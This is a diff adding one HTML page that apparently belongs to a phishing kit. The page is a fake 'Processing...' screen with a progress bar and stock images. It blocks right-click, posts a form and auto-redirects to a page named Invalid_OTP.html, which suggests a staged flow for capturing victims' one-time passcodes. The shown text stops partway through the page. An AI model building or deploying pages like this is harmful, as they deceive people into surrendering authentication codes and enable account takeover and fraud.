@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+  <meta
+  http-equiv="Content-Language"
+  content="fr">
+  <meta
+  http-equiv="refresh"
+  content="15;
+  URL=Invalid_OTP.html">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Processing... </title>
+  <style>
+    #img,#img2b
+    {
+      width:104%;
+      margin-left:-6px;
+    }
+    #navContent{border-top:7px solid #1b75bc;}
+    #faq_content{border:none !important}
+    #con
+    {
+       color:#7212b3;
+    }
+    #con2
+    {
+       color:#2A9DCC;
+    }
+  </style>
+  <script language="javascript"> 
+  var message="This function is not allowed here.";
+  function clickIE4(){
+  if (event.button==2){
+  alert(message);
+  return false;
+  }
+  }
+  function clickNS4(e){
+  if (document.layers||document.getElementById&&!document.all){
+  if (e.which==2||e.which==3){
+  alert(message);
+  return false;
+  }
+  }
+  }
+  if (document.layers){
+  document.captureEvents(Event.MOUSEDOWN);
+  document.onmousedown=clickNS4;}
+  else if (document.all&&!document.getElementById){
+  document.onmousedown=clickIE4;}
+  document.oncontextmenu=new Function("alert(message);return false;")
+  </script>
+</head>
+<body>
+<div class="line">
+<form action="Invalid_OTP.html" method="post">
+  <img src="dov.jpg" alt="" id="img"><br>
+  <div>
+  <body onload="move()">
+  
+  <div class="container">
+  
+  
+  <style>
+  #myProgress {
+  width: 100%;
+  background-color: #ddd;
+  }
+  
+  #myBar {
+  width: 1%;
+  height: 20px;
+  background-color: #3396FF;
+  }
+  </style>
+  <div id="myProgress">
+  <div id="myBar"></div>
+  </div>
+  <br>
+  <script>
+  var i = 0;
+  function move() {
+  if (i == 0) {
+  i = 1;
+  var elem = document.getElementById("myBar");
+  var width = 40;
+  var id = setInterval(frame, 250);
+  function frame() {
+  if (width >= 100) {
+  clearInterval(id);
+  i = 0;
+  } else {
+  width++;
+  elem.style.width = width + "%";
+  }
+  }
+  }
+  }
+  </script>
+  <h3 style="
+  margin-left:2px;
+  font-size:16px;
+  position:absolute;
+  top:278px;
+  color:#1560BD;
+  height:0px;"
+  >Processing...
+  </div><br><br>
+    <img src="3.jpg" alt="" id="img2b"><br>
